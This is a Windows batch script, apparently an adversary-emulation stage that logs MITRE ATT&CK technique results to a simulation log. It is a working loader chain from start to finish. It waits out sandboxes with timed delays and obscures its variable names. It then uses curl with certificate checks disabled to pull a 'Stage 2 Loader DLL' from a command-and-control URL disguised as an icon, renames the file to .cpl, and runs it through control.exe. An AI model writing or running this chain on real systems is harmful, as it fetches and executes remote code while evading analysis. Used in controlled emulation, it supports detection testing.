@echo off
setlocal enabledelayedexpansion

SET pvnxkl=%APPDATA%\10444\20f7d347
SET rwmtjq=38adadf0.txt
SET hzsdby=https://10.0.0.49/stage/2/icon.png?10444-7
SET cqfwae=BALAM-S2BO
SET ylbxop=10444
SET tgmruz=7

SET logfile=%APPDATA%\!tgmruz!\macula-simulations.log
if not exist "%APPDATA%\!tgmruz!" mkdir "%APPDATA%\!tgmruz!"

SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!cqfwae!][!ylbxop!]: script_start>> "!logfile!" 2>nul

REM Initial anti-sandbox delay (10-20s) before any logic
timeout /t 15 /nobreak >nul

REM Random delay component
SET /A delay=%RANDOM% %% 20 + 10
timeout /t %delay% /nobreak >nul

echo [!tsvar!][DEBUG][!cqfwae!][!ylbxop!]: anti_analysis_start>> "!logfile!" 2>nul

REM Anti-analysis: debugger-attached check via wmic (behavioral signal only, never aborts)
wmic process where "name='cscript.exe' or name='wscript.exe'" get ProcessId >nul 2>&1

REM Additional delay between anti-analysis and heartbeat
ping -n 8 127.0.0.1 >nul

echo [!tsvar!][DEBUG][!cqfwae!][!ylbxop!]: anti_analysis_complete>> "!logfile!" 2>nul

REM Log anti-analysis TTP result (always OK — evasion variant never aborts)
echo [%date% %time%][TTP][!cqfwae!][!ylbxop!]: T1497|Virtualization/Sandbox Evasion=[OK]:[]>> "!logfile!" 2>nul

echo [!tsvar!][DEBUG][!cqfwae!][!ylbxop!]: heartbeat_start>> "!logfile!" 2>nul

REM Heartbeat fetch: single curl call signals liveness to C2 and downloads Stage 2 Loader DLL
REM Response body is the Loader DLL written to %APPDATA%\10444\20f7d347\38adadf0.txt
curl -k -s -o "!pvnxkl!\!rwmtjq!" "!hzsdby!"
SET hberr=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfwae!][!ylbxop!]: heartbeat_complete>> "!logfile!" 2>nul

REM Log heartbeat TTP result
if %hberr%==0 (
    echo [%date% %time%][TTP][!cqfwae!][!ylbxop!]: T1071|Application Layer Protocol=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!cqfwae!][!ylbxop!]: T1071|Application Layer Protocol=[FAIL]:[curl_failed]>> "!logfile!" 2>nul
)

REM Delay between heartbeat and directory change
CHOICE /C Y /N /D Y /T 7 >nul

echo [!tsvar!][DEBUG][!cqfwae!][!ylbxop!]: chdir_start>> "!logfile!" 2>nul

REM Change working directory to Loader output location
cd /d "!pvnxkl!" >nul 2>&1
SET cderr=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfwae!][!ylbxop!]: chdir_result=%cderr%>> "!logfile!" 2>nul

REM Delay before LOLBIN invocation
ping -n 6 127.0.0.1 >nul

REM Rename downloaded Loader DLL to CPL extension for control.exe proxy execution
echo [!tsvar!][DEBUG][!cqfwae!][!ylbxop!]: dll_load>> "!logfile!" 2>nul
rename "!rwmtjq!" file.cpl 2>nul

REM Delay before process start
timeout /t 5 /nobreak >nul

echo [!tsvar!][DEBUG][!cqfwae!][!ylbxop!]: process_start>> "!logfile!" 2>nul

REM LOLBIN invocation: control.exe proxies execution of the Loader DLL via CPlApplet export
REM Loader DLL must export CPlApplet for control.exe to invoke it
control.exe file.cpl
SET lberr=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfwae!][!ylbxop!]: command_execution_complete>> "!logfile!" 2>nul

REM Log LOLBIN TTP result
if %lberr%==0 (
    echo [%date% %time%][TTP][!cqfwae!][!ylbxop!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!cqfwae!][!ylbxop!]: T1218|System Binary Proxy Execution=[FAIL]:[lolbin_invocation_failed]>> "!logfile!" 2>nul
)

echo [!tsvar!][DEBUG][!cqfwae!][!ylbxop!]: script_exit>> "!logfile!" 2>nul

endlocal